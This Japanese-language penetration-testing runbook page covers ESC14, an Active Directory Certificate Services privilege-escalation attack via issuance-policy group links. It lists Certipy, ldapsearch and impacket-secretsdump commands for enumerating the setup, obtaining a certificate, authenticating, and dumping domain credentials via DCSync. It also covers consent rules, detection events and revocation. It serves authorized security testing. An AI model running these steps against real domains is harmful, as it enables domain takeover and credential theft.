# ESC14 — Issuance Policies 悪用（OID グループリンクチェーン）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行・OID グループリンクの書き換えに業務停止リスクは低い）
> - [x] 不可逆な設定変更を含む（OID グループリンクの書き換えを行った場合）
>
> 実施可否は事前合意で明示確認すること。取得した証明書は案件終了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

以下のすべてが揃ったときに実施する：

- テンプレートに `msPKI-Certificate-Policy`（Issuance Policy OID）が設定されている
- その Issuance Policy OID が `msDS-OIDToGroupLink` 属性で AD グループ（特に特権グループ）にリンクされている
- 低権限ユーザーがそのテンプレートへの Enrollment 権限を持つ
- テンプレートが `Client Authentication` EKU を含む（または Universal 設定）

**攻撃者の思考トレース：** AD CS では Issuance Policy（発行ポリシー）を証明書テンプレートに付与できる。この Issuance Policy が `msDS-OIDToGroupLink` を通じて AD グループ（例: `Domain Admins`）にリンクされている場合、そのポリシーを持つ証明書を取得したアカウントはリンク先グループのメンバーとして扱われる（Universal Group Membership のような振る舞い）。低権限ユーザーがこのテンプレートに登録できれば、実質的に特権グループのメンバーとして証明書認証が通る。

> **注意（ESC14 は非常に稀なケース）：** `msDS-OIDToGroupLink` によるグループリンクは実環境ではほぼ見られない。管理者が意図的に設定しない限り存在しない。また Certipy での検出サポートはバージョンによって異なり、手動での LDAP 確認が必要になる場合が多い。PoC が少なく、動作確認済み環境は非常に限定的。

---

## 環境前提

- **実行環境**: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- **必要なツール**:
  - Certipy 4.x 以降（`pip install certipy-ad --break-system-packages`。要インストール確認）
  - `ldapsearch` または PowerShell AD モジュール（OID グループリンクの手動確認用）
- **必要な権限**: 対象テンプレートへの Enrollment 権限を持つドメインユーザー（低権限で可）
- **オフライン代替**: LDAP 確認は PowerShell の `Get-ADObject` で代替可能

---

## 観点・着眼点

### 先に確認すること

```bash
# [Attacker] Certipy で Issuance Policy リンクを確認
certipy find \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -stdout
```

Issuance Policy リンクが存在する場合の出力例：

```
Certificate Templates
  0
    Template Name                       : [TEMPLATE_NAME]
    Client Authentication               : True
    Issuance Policies                   : [OID_VALUE]    ← ポリシー OID が設定されている
    ...
    [!] Vulnerabilities
      ESC14                             : OID '[OID_VALUE]' is linked to group '[PRIVILEGED_GROUP]'
```

手動で `msDS-OIDToGroupLink` を LDAP から確認する：

```bash
# [Attacker] OID コンテナを LDAP で検索
ldapsearch \
  -H ldap://[DC_IP] \
  -x -D "[USER]@[DOMAIN]" \
  -w "[PASSWORD]" \
  -b "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=[DOMAIN_PART],DC=[DOMAIN_PART]" \
  "(msDS-OIDToGroupLink=*)" dn msDS-OIDToGroupLink displayName
# msDS-OIDToGroupLink に値があれば OID グループリンクが存在する
```

リンク先グループを確認する：

```bash
# [Attacker] リンク先グループの DN を特定
ldapsearch \
  -H ldap://[DC_IP] \
  -x -D "[USER]@[DOMAIN]" \
  -w "[PASSWORD]" \
  -b "[LINKED_GROUP_DN]" \
  "(objectClass=group)" dn member
```

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| `ESC14` が `[!] Vulnerabilities` に表示 | 手順 Step 1 へ直接進む |
| `msDS-OIDToGroupLink` の値が非特権グループを指す | ESC14 の影響は低い。リンク先グループが持つ権限を BloodHound で別途確認する |
| OID グループリンクが存在しない | ESC14 は使えない。他の ESC を確認する |
| テンプレートへの Enrollment 権限がない | 保持している権限（GenericAll / WriteDACL 等）で Enrollment 権限を追加できるか確認する |

---

## 手順

事前準備（必須）：時刻同期

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

### Step 1: 対象テンプレートで証明書を申請する

```bash
# [Attacker] Issuance Policy OID 付きテンプレートで証明書を申請
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP]
# → 申請者（[USER]）名で証明書が発行される
# → 証明書内に Issuance Policy OID が埋め込まれる
```

### Step 2: 証明書で PKINIT 認証 → グループメンバーとして認証

```bash
# [Attacker] PKINIT 認証（OID リンクグループのメンバーとして振る舞う）
certipy auth \
  -pfx [USER].pfx \
  -dc-ip [DC_IP]
# → TGT には OID リンク先グループのメンバーシップが付与されている（環境依存）
```

### Step 3: TGT で特権操作を試みる

```bash
# [Attacker] 取得した TGT で DCSync や横展開を試みる
export KRB5CCNAME=[USER].ccache
impacket-secretsdump \
  -k -no-pass \
  -target-ip [DC_IP] \
  [DOMAIN]/[USER]@[DC_FQDN]
```

### 原状回復：証明書の失効

```bash
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy auth` で TGT は取得できたが特権操作が失敗する | OID グループリンクが認証セッションに反映されない環境の可能性。KDC の設定・AD CS バージョンに依存する |
| `msDS-OIDToGroupLink` が見つからない | ESC14 の条件が存在しない。他の ESC を確認する |
| テンプレートが Certipy で ESC14 として検出されない | Certipy のバージョンが古い可能性。最新版にアップデートするか手動で LDAP 確認する |
| `OID Group Link` が特権グループを指さない | リンク先グループの実際の権限を BloodHound で確認し、影響度を評価する |

---

## 注意点・落とし穴

- **OID グループリンクは通常は存在しない**：`msDS-OIDToGroupLink` は AD CS の高度な機能であり、意図して設定されていない限り存在しない。他の ESC（ESC1〜ESC8）を先に確認した上で ESC14 に至る
- **KDC の挙動はバージョン依存**：OID グループリンクが TGT のメンバーシップに反映されるかどうかは KDC のバージョンと設定に依存する。実際には刺さらない環境も多い
- **Certipy 4.x のみサポート**：`msDS-OIDToGroupLink` の検出と表示は Certipy 4.x 以降で実装。古いバージョンでは ESC14 として表示されない
- **Write 権限を使って OID グループリンクを改ざんする（より稀なケース）**：もし `msDS-OIDToGroupLink` オブジェクトへの Write 権限がある場合、別グループへのリンクを変更して悪用することも理論上は可能だが、実環境では確認済み事例が極めて少ない

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。OID グループリンク経由での特権グループへの昇格を伴う
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（証明書要求・発行）/ 4768（TGT 要求）/ MDI アラート
- **業務影響リスク**: 証明書発行自体は業務影響なし。OID グループリンクの改ざんを行う場合は別途評価が必要
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効 / ✅ 取得した TGT・ccache ファイルの暗号化保管・案件終了時破棄 / ✅ OID グループリンクを改ざんした場合は元に戻す
- **取得情報の取扱**: pfx ファイル・TGT は暗号化保管、案件終了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：ESC5（PKI オブジェクトへの Write ACL 悪用。OID オブジェクトへの Write 権限がある場合）→ `./ESC5.md`
- 後：証明書取得後の横展開 → `../Kerberos_Attacks/Pass_The_Ticket.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
